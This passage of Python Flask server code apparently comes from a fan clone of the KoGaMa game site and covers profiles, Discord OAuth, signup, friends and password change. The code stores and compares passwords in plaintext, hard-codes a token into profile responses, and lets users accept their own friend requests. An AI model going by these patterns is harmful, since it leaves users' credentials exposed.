            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        },
      "locale": user_language,
      "referrers": [
        {"referrer_id": 1, "name": "Kagama", "codename": "kogama", "urls": ""},
        {"referrer_id": 2, "name": "old_spilgames", "codename": "OldSpilGames", "urls": ""},
        {"referrer_id": 3, "name": "AdNPlay", "codename": "adnplay", "urls": ""},
        {"referrer_id": 4, "name": "GSM", "codename": "gsm", "urls": "games\\.poki\\.com|..."},
        {"referrer_id": 5, "name": "Miniplay", "codename": "miniplay", "urls": "minijuegos\\.com|..."},
        {"referrer_id": 6, "name": "ORANGE", "codename": "orange", "urls": "kizi\\.com|..."},
        {"referrer_id": 7, "name": "CRAZYGAMES", "codename": "crazygames", "urls": "crazygames\\.com|..."},
        {"referrer_id": 8, "name": "SpilGames", "codename": "spilgames", "urls": "cdn\\.gameplayer\\.io|..."}
      ],
      "now": "2026-05-27T02:21:30.794785+00:00",
      "ads_data": {
        "host": "www.kogama.com",
        "ref": "kogama",
        "consent": True,
        "name": "Google AdManager (old account)",
        "ads": {
          "top_banner": {"num": "0", "id": "kogama_mobile_leaderboard_1", "ad_unit_code": "leaderboard", "sizes": "[728, 90]"},
          "skyscraper_left": {"num": "1", "id": "kogama-skyscraper-left", "sizes": "[160, 600]"},
          "skyscraper_right": {"num": "2", "id": "kogama-skyscraper-right", "sizes": "[160, 600]"},
          "bottom_banner": {"num": "4", "id": "kogama_mobile_leaderboard_2", "sizes": "[728, 90]"},
          "comment_ad": {"num": "5", "id": "kogama_rectangle", "sizes": "[300, 250]"},
          "wide_skyscraper": {"num": "3", "id": "kogama-wide-skyscraper", "sizes": "[300, 600]"},
          "game_list_banner": {"num": "6", "id": "kogama_mobile_game_list_banner", "sizes": "[728, 90]"}
        },
        "network_code": "46278883"
      }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    breadcrumb_data = [{'url': f'/profile/{user_id}/', 'title': current_user.username}, {'url': f'/profile/{user_id}/edit/', 'title': 'Edit Profile'}]
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data=breadcrumb_data, submenu_data="null", object_data=object_data), 200

@app.route('/profile/<int:user_id>/username/')
def profile_username(user_id):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    object_data = {
      "object": {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": 1,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        },
      "locale": user_language,
      "referrers": [
        {"referrer_id": 1, "name": "Kagama", "codename": "kogama", "urls": ""},
        {"referrer_id": 2, "name": "old_spilgames", "codename": "OldSpilGames", "urls": ""},
        {"referrer_id": 3, "name": "AdNPlay", "codename": "adnplay", "urls": ""},
        {"referrer_id": 4, "name": "GSM", "codename": "gsm", "urls": "games\\.poki\\.com|..."},
        {"referrer_id": 5, "name": "Miniplay", "codename": "miniplay", "urls": "minijuegos\\.com|..."},
        {"referrer_id": 6, "name": "ORANGE", "codename": "orange", "urls": "kizi\\.com|..."},
        {"referrer_id": 7, "name": "CRAZYGAMES", "codename": "crazygames", "urls": "crazygames\\.com|..."},
        {"referrer_id": 8, "name": "SpilGames", "codename": "spilgames", "urls": "cdn\\.gameplayer\\.io|..."}
      ],
      "now": "2026-05-27T02:21:30.794785+00:00",
      "ads_data": {
        "host": "www.kogama.com",
        "ref": "kogama",
        "consent": True,
        "name": "Google AdManager (old account)",
        "ads": {
          "top_banner": {"num": "0", "id": "kogama_mobile_leaderboard_1", "ad_unit_code": "leaderboard", "sizes": "[728, 90]"},
          "skyscraper_left": {"num": "1", "id": "kogama-skyscraper-left", "sizes": "[160, 600]"},
          "skyscraper_right": {"num": "2", "id": "kogama-skyscraper-right", "sizes": "[160, 600]"},
          "bottom_banner": {"num": "4", "id": "kogama_mobile_leaderboard_2", "sizes": "[728, 90]"},
          "comment_ad": {"num": "5", "id": "kogama_rectangle", "sizes": "[300, 250]"},
          "wide_skyscraper": {"num": "3", "id": "kogama-wide-skyscraper", "sizes": "[300, 600]"},
          "game_list_banner": {"num": "6", "id": "kogama_mobile_game_list_banner", "sizes": "[728, 90]"}
        },
        "network_code": "46278883"
      }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": 1,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    breadcrumb_data = [{'url': f'/profile/{user_id}/', 'title': current_user.username}, {'url': f'/profile/{user_id}/username/', 'title': 'Username'}]
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data=breadcrumb_data, submenu_data="null", object_data=object_data), 200

@app.route('/auth/discord/status', methods=['GET'])
def discord_status():
    return jsonify({
        "configured": discord_oauth_configured(),
        "icon_url": DISCORD_ICON_URL,
        "bot_invite_url": DISCORD_BOT_INVITE_URL,
        "verification": current_discord_verification()
    }), 200


@app.route('/auth/discord/start', methods=['GET'])
def discord_oauth_start():
    if not discord_oauth_configured():
        return jsonify({
            "error": "Discord OAuth is not configured. Set DISCORD_CLIENT_ID and DISCORD_CLIENT_SECRET."
        }), 503
    next_url = safe_next_url(request.args.get("next") or request.referrer or url_for("home"))
    state = secrets.token_urlsafe(32)
    session["discord_oauth_state"] = state
    session["discord_oauth_next"] = next_url
    params = {
        "client_id": DISCORD_CLIENT_ID,
        "redirect_uri": discord_redirect_uri(),
        "response_type": "code",
        "scope": "identify",
        "state": state,
        "prompt": "consent"
    }
    return redirect(f"{DISCORD_AUTHORIZE_URL}?{urlencode(params)}")


@app.route('/auth/discord/callback', methods=['GET'])
def discord_oauth_callback():
    next_url = safe_next_url(session.pop("discord_oauth_next", None))
    expected_state = session.pop("discord_oauth_state", None)
    returned_state = request.args.get("state")
    code = request.args.get("code")
    if not expected_state or returned_state != expected_state or not code:
        return redirect(append_query_param(next_url, "discord_error", "invalid_state"))
    if not discord_oauth_configured():
        return redirect(append_query_param(next_url, "discord_error", "not_configured"))
    token_response = requests.post(
        DISCORD_TOKEN_URL,
        data={
            "client_id": DISCORD_CLIENT_ID,
            "client_secret": DISCORD_CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": discord_redirect_uri()
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )
    if token_response.status_code >= 400:
        return redirect(append_query_param(next_url, "discord_error", "token"))
    access_token = token_response.json().get("access_token")
    if not access_token:
        return redirect(append_query_param(next_url, "discord_error", "token"))
    user_response = requests.get(
        DISCORD_USER_URL,
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=10
    )
    if user_response.status_code >= 400:
        return redirect(append_query_param(next_url, "discord_error", "user"))
    payload = discord_payload_from_api_user(user_response.json())
    if not payload.get("id"):
        return redirect(append_query_param(next_url, "discord_error", "user"))
    linked_user = db.session.query(User).filter(User.discord_id == payload["id"]).first()
    if current_user.is_authenticated:
        if linked_user and linked_user.id != current_user.id:
            return redirect(append_query_param(next_url, "discord_error", "already_linked"))
        apply_discord_verification(current_user, payload)
        db.session.commit()
        send_verification_discord_notification(current_user, payload)
    else:
        if linked_user:
            return redirect(append_query_param(next_url, "discord_error", "already_linked"))
        session["pending_discord_verification"] = payload
    return redirect(append_query_param(next_url, "discord_verified", "1"))

@app.route('/user/', methods=['GET', 'POST'])
def create_user():
    if request.method == 'GET':
        current_user_id = current_user.id if current_user.is_authenticated else None
        search_query = request.args.get('q', default=None, type=str)
        count = request.args.get('count', default=20, type=int)
        if count < 1: count = 1
        if count > 400:
            count = 400
        page = request.args.get('page', default=1, type=int)
        if page < 1:
            page = 1
        offset_value = (page - 1) * count
        query = db.session.query(User)
        if current_user_id:
            query = query.filter(User.id != current_user_id)
        total_records = query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        prev_url = f"/user/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/user/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = [{
            "url": f"/user/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        }]
        if search_query:
            if search_query.isdigit():
                if current_user_id and int(search_query) == current_user_id:
                    return jsonify({"data": [], "paging": {
                        "count": count,
                        "total": total_records,
                        "prev_url": prev_url,
                        "next_url": next_url,
                        "page": page,
                        "pages": total_pages,
                        "paging_links": paging_links
                    }})
                query = query.filter(User.id == int(search_query))
            else:
                query = query.filter(User.username.ilike(f"%{search_query}%"))
            user = query.order_by(User.id.desc()).first()
            if not user:
                return jsonify({"data": [], "paging": {}})
            user_datas = [{
                'id': user.id,
                'username': user.username,
                'avatar_id': user.avatar_id,
                'friend_images': user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
                'token-board': user.to_dict().get('token-board')
            }]
            for user_data in user_datas:
                active_avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == user.id, Avatar.is_active == True)).first()
                if active_avatar and active_avatar.images:
                    _av = json.loads(active_avatar.images)
                    user_data["friend_images"]["micro"] = _av.get('micro')
                    user_data["friend_images"]["small"] = _av.get('small')
                    user_data["friend_images"]["medium"] = _av.get('medium')
                    user_data["friend_images"]["large"] = _av.get('large')
            return jsonify({"data": user_datas, "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }})
        latest_users = (
            query
            .order_by(User.id.desc())
            .limit(count)
            .offset(offset_value)
            .all()
        )
        user_lists = []
        for u in latest_users:
            user_list = {
                'id': u.id,
                'username': u.username,
                'avatar_id': u.avatar_id,
                'friend_images': u.AVATAR_IMAGES_MAP.get(u.avatar_id, {}),
                'token-board': u.to_dict().get('token-board')
            }
            active_avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == u.id, Avatar.is_active == True)).first()
            if active_avatar and active_avatar.images:
                _av = json.loads(active_avatar.images)
                user_list["friend_images"]["micro"] = _av.get('micro')
                user_list["friend_images"]["small"] = _av.get('small')
                user_list["friend_images"]["medium"] = _av.get('medium')
                user_list["friend_images"]["large"] = _av.get('large')
            user_lists.append(user_list)
        response_payload = {
            "data": user_lists,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200
    @limiter.limit("5 per minute; 4 per 30 minutes")
    def handle_post():
        if current_user.is_authenticated:
            return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
        EMAIL_REGEX = r"^[\w\.-]+@[\w\.-]+\.\w+$"
        data = request.get_json(silent=True) or {}
        username = str(data.get('username', '')).strip()
        password = str(data.get('password1', ''))
        password_confirm = str(data.get('password2', ''))
        avatar_id = int(data.get('avatar_id', 17873))
        raw_email = data.get('email')
        if raw_email is not None and raw_email != '':
            email = str(raw_email).strip()
        else:
            email = None
        birthdate = str(data.get('birthdate', '1970-01-01'))
        if password != password_confirm:
            return jsonify({'error': {'__all__': ['Password must be equal to validate it']}}), 400
        if not username or not re.match(r"^[a-zA-Z0-9 _-]+$", username):
            return jsonify({'error': {'__all__': ['Username can\'t contain symbols and cannot be empty.']}}), 400
        existing_user = db.session.query(User).filter(
            func.lower(User.username) == func.lower(username)
        ).first()
        if existing_user:
            return jsonify({'error': {'__all__': ['Username already taken.']}}), 400
        if email and not re.match(EMAIL_REGEX, email):
            return jsonify({'error': {'__all__': ['Email address is not valid.']}}), 400
        if email:
            existing_email = db.session.query(User).filter(
                func.lower(User.email) == func.lower(email)
            ).first()

            if existing_email:
                return jsonify({'error': {'__all__': ['Email already in use.']}}), 400
        pending_discord = session.get("pending_discord_verification")
        if pending_discord:
            linked_user = db.session.query(User).filter(User.discord_id == pending_discord.get("id")).first()
            if linked_user:
                return jsonify({'error': {'__all__': ['Discord account is already linked to another account.']}}), 400
        new_user = User(
            username=username,
            password=password,
            email=email,
            birthdate=birthdate,
            avatar_id=avatar_id,
            language=request.cookies.get('language', 'en_US')
        )
        if pending_discord:
            apply_discord_verification(new_user, pending_discord)
        db.session.add(new_user)
        db.session.flush()
        avatar = Avatar(
            user_id=new_user.id,
            username=new_user.username,
            avatar_id=new_user.avatar_id,
            avatar_name=new_user.AVATAR_IMAGES_MAP.get(new_user.avatar_id, {}).get("avatar_name", ""),
            images=json.dumps({
                'micro': new_user.AVATAR_IMAGES_MAP.get(new_user.avatar_id, {}).get("micro", ""),
                'small': new_user.AVATAR_IMAGES_MAP.get(new_user.avatar_id, {}).get("small", ""),
                'medium': new_user.AVATAR_IMAGES_MAP.get(new_user.avatar_id, {}).get("medium", ""),
                'large': new_user.AVATAR_IMAGES_MAP.get(new_user.avatar_id, {}).get("large", "")
            }),
            is_active=True
        )
        db.session.add(avatar)
        db.session.commit()
        if pending_discord:
            send_verification_discord_notification(new_user, pending_discord)
            session.pop("pending_discord_verification", None)
        login_user(new_user)
        return jsonify(new_user.to_dict())
    return handle_post()

@app.route('/user/avatars/', methods=['GET'])
def user_avatars():
    if not current_user.is_authenticated:
        return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
    user = db.session.get(User, current_user.id)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 1: count = 1
        if count > 50:
            count = 50
        base_query = db.session.query(Avatar).filter(Avatar.user_id == user.id)
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        avatars = base_query.order_by(Avatar.id.desc()).offset(offset_value).limit(count).all()
        avatars_data = [avatar.to_dict() for avatar in avatars]
        for avatar_data in avatars_data:
            avatar_data["is_active"] = avatar_data["avatar_id"] == user.avatar_id
        for avatar in avatars:
            avatar.is_active = avatar_data["avatar_id"] == user.avatar_id
        db.session.commit()
        prev_url = f"/user/{user.id}/avatar/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/user/{user.id}/avatar/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/user/{user.id}/avatar/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": avatars_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200

@app.route('/user/<int:user_id>/', methods=['GET', 'PUT'])
def user_data(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    if request.method == 'GET':
        # Self: return the full profile (keeps editable fields intact).
        if current_user.is_authenticated and user_id == current_user.id:
            return jsonify(current_user.to_dict()), 200
        # Anyone else: return a PUBLIC profile only. Never leak password,
        # email, role, ban/lock state, 2FA, birthdate or discord data - the
        # full to_dict() exposes those (incl. a base64 of the password).
        is_friend = False
        if current_user.is_authenticated:
            is_friend = bool(db.session.query(Friend).filter(or_(
                and_(Friend.profile_id == current_user.id, Friend.friend_profile_id == user.id, Friend.friend_status == "accepted"),
                and_(Friend.profile_id == user.id, Friend.friend_profile_id == current_user.id, Friend.friend_status == "accepted")
            )).first())
        return jsonify({
            "id": user.id,
            "username": user.username,
            "display_name": user.display_name,
            "avatar_id": user.avatar_id,
            "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
            "level": user.level,
            "xp": user.xp,
            "next_level_xp": user.next_level_xp,
            "xp_to_next_level": user.xp_to_next_level,
            "previous_level_xp": user.previous_level_xp,
            "level_progress": user.level_progress,
            "level_images": get_level_images(user._level),
            "friends": user.friends,
            "description": user.description,
            "gold": user.gold,
            "created": user.created.isoformat() if user.created else None,
            "last_ping": user.last_ping.isoformat() if user.last_ping else None,
            "leaderboard_rank": user.rank,
            "is_active": True,
            "is_subscriber": False,
            "is_elite": user.is_elite,
            "pulse_status": user.pulse_status,
            "is_me": False,
            "is_friend": is_friend,
            "object_type_id": 1,
        }), 200
    # PUT: self-update only.
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    description = data.get('description', '')
    birthdate = str(data.get('birthdate', '1970-01-01'))
    current_user.description = description
    current_user.birthdate = birthdate
    db.session.commit()
    return jsonify({'__all__': ['User profile details updated']}), 200

@app.route('/user/<int:user_id>/friend/', methods=['GET', 'POST'])
def user_friends_data(user_id):
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 1: count = 1
        if count > 400:
            count = 400
        sent_friends_query = db.session.query(Friend).filter(Friend.profile_id == user_id, Friend.friend_status == "accepted")
        received_friends_query = db.session.query(Friend).filter(Friend.friend_profile_id == user_id, Friend.friend_status == "accepted")
        base_query = received_friends_query.union(sent_friends_query)
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        friends = base_query.order_by(Friend.id.desc()).offset(offset_value).limit(count).all()
        friends_data = []
        for friend in friends:
            friend_dict = friend.to_dict()
            if friend_dict["profile_id"] != user_id:
                orig_profile_id = friend_dict["profile_id"]
                friend_dict["profile_id"] = friend_dict["friend_profile_id"]
                friend_dict["friend_profile_id"] = orig_profile_id
                orig_username = friend_dict["profile_username"]
                friend_dict["profile_username"] = friend_dict["friend_username"]
                friend_dict["friend_username"] = orig_username
            friends_data.append(friend_dict)
        # Resolve live avatars (fixes blank avatars + stale snapshots)
        for fd in friends_data:
            friend_user = db.session.get(User, fd.get("profile_id"))
            if friend_user:
                fd["friend_images"] = avatar_images_for(friend_user.avatar_id)
                fd["avatar_id"] = friend_user.avatar_id
            else:
                fd["friend_images"] = avatar_images_for(17873)
                fd["avatar_id"] = 17873
        prev_url = f"/user/{user_id}/friend/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/user/{user_id}/friend/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/user/{user_id}/friend/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": friends_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    target_id = int(data.get('user_id'))
    user = db.session.get(User, target_id)
    if not target_id:
        return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
    if not db.session.query(Friend).filter(Friend.friend_profile_id == user_id, Friend.profile_id == target_id).first():
        friend = Friend(
            profile_username=current_user.username,
            friend_username=user.username,
            profile_id=current_user.id,
            friend_profile_id=user.id,
            friend_images=json.dumps(avatar_images_for(user.avatar_id))
        )
        db.session.add(friend)
        db.session.commit()
        return jsonify({'data': {'friend_status': 'pending'}}), 200

@app.route('/user/<int:user_id>/friend/<int:friend_id>/', methods=['GET', 'PUT', 'DELETE'])
def user_friend_data(user_id, friend_id):
    friend_sent = db.session.query(Friend).filter(Friend.profile_id == user_id, Friend.friend_profile_id == friend_id).first()
    friend_received = db.session.query(Friend).filter(Friend.profile_id == friend_id, Friend.friend_profile_id == user_id).first()
    if request.method == 'GET':
        if friend_sent:
            friend_sent_data = friend_sent.to_dict()
            return jsonify(friend_sent_data), 200
        elif friend_received:
            friend_received_data = friend_received.to_dict()
            orig_profile_id = friend_received_data["profile_id"]
            friend_received_data["profile_id"] = friend_received_data["friend_profile_id"]
            friend_received_data["friend_profile_id"] = orig_profile_id
            orig_username = friend_received_data["profile_username"]
            friend_received_data["profile_username"] = friend_received_data["friend_username"]
            friend_received_data["friend_username"] = orig_username
            user = db.session.get(User, friend_received_data["friend_profile_id"])
            return jsonify(friend_received_data), 200
        else:
            abort(404)
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    if not friend_received and not friend_sent:
        abort(404)
    elif request.method == 'PUT':
        if friend_sent and friend_sent.friend_status == "pending":
            friend_sent.friend_status = "accepted"
        if friend_received and friend_received.friend_status == "pending":
            friend_received.friend_status = "accepted"
        db.session.get(User, user_id).friends += 1
        db.session.get(User, friend_id).friends += 1
        db.session.commit()
        return jsonify({'data': {'friend_status': 'accepted'}}), 200
    elif request.method == 'DELETE':
        is_pending_sent_request = friend_sent and friend_sent.friend_status == "pending"
        is_pending_received_request = friend_received and friend_received.friend_status == "pending"
        if friend_sent:
            db.session.delete(friend_sent)
        if friend_received:
            db.session.delete(friend_received)
        db.session.commit()
        if is_pending_sent_request:
            return jsonify({'data': {}}), 200
        elif is_pending_received_request:
            return jsonify({'data': {}}), 200
        else:
            db.session.get(User, user_id).friends -= 1
            db.session.get(User, friend_id).friends -= 1
            db.session.commit()
            return jsonify({'data': {}}), 200

@app.route('/user/<int:user_id>/friend/requests/')
def view_friend_requests(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 1: count = 1
        if count > 50:
            count = 50
        sent_pending_query = db.session.query(Friend).filter(Friend.profile_id == user_id, Friend.friend_status == "pending")
        received_pending_query = db.session.query(Friend).filter(Friend.friend_profile_id == user_id, Friend.friend_status == "pending")
        base_query = received_pending_query.union(sent_pending_query)
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        friend_requests = base_query.order_by(Friend.id.desc()).offset(offset_value).limit(count).all()
        friend_requests_data = [friend_request.to_dict() for friend_request in friend_requests]
        for friend_request_data in friend_requests_data:
            if friend_request_data["profile_id"] == user_id:
                target_friend_id = friend_request_data["friend_profile_id"]
        prev_url = f"/user/{user_id}/friend/requests/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/user/{user_id}/friend/requests/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/user/{user_id}/friend/requests/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": friend_requests_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200

@app.route('/user/<int:user_id>/friend/chat/', methods=['GET'])
def view_friends_chat(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    sent_pending_query = db.session.query(Friend).filter(Friend.profile_id == user_id, Friend.friend_status == "accepted")
    received_pending_query = db.session.query(Friend).filter(Friend.friend_profile_id == user_id, Friend.friend_status == "accepted")
    base_query = received_pending_query.union(sent_pending_query)
    friend_requests = base_query.order_by(Friend.id.desc()).all()
    friend_requests_data = [friend_request.to_dict() for friend_request in friend_requests]
    for friend_request_data in friend_requests_data:
        if friend_request_data["profile_id"] == user_id:
            target_friend_id = friend_request_data["friend_profile_id"]
            friend_request_data["profile_username"] = friend_request_data["friend_username"]
            friend_request_data["username"] = friend_request_data.pop("friend_username")
            friend_request_data["profile_id"] = friend_request_data.pop("friend_profile_id")
        else:
            target_friend_id = friend_request_data["profile_id"]
            friend_request_data["username"] = friend_request_data.pop("profile_username")
            friend_request_data["profile_username"] = friend_request_data.pop("friend_username")
            friend_request_data["profile_id"] = friend_request_data.pop("profile_id")
        friend_request_data.pop("id", None)
        friend_request_data.pop("friend_id", None)
        user = db.session.get(User, target_friend_id)
        if user:
            friend_request_data["last_ping"] = user.last_ping.isoformat() if user.last_ping else None
            pattern = r"^(.*)?(/games/play/\d+|/build/\d+/project/\d+|)"
            if re.search(pattern, user.location):
                friend_request_data["location"] = user.location
            else:
                if user.pulse_status == 2:
                    friend_request_data["location"] = "/"
                else:
                    friend_request_data["location"] = None
            friend_request_data["pulse_status"] = user.pulse_status
            active_avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == friend_request_data["profile_id"], Avatar.is_active == True)).first()
            if active_avatar and active_avatar.images:
                _av = json.loads(active_avatar.images)
                friend_request_data["friend_images"]["micro"] = _av.get('micro')
                friend_request_data["friend_images"]["small"] = _av.get('small')
                friend_request_data["friend_images"]["medium"] = _av.get('medium')
                friend_request_data["friend_images"]["large"] = _av.get('large')
    response_payload = {
        "data": friend_requests_data,
    }
    return jsonify(response_payload), 200

@app.route('/user/<int:user_id>/password/', methods=['PUT'])
def change_password(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    old_password = str(data.get('password_old', ''))
    password1 = str(data.get('password1', ''))
    password2 = str(data.get('password2', ''))
    if password1 != password2:
        return jsonify({'error': {'__all__': ['Password must be equal to validate it']}}), 400
    if current_user.password == old_password:
        current_user.password = password1
        db.session.commit()
        return jsonify({'__all__': ['User password changed']}), 200
    else:
        return jsonify({'error': {'__all__': ['Old password is incorrect.']}}), 400

@app.route('/user/<int:user_id>/email/', methods=['PUT'])
def update_email(user_id):
    if not current_user.is_authenticated or user_id != current_user.id:
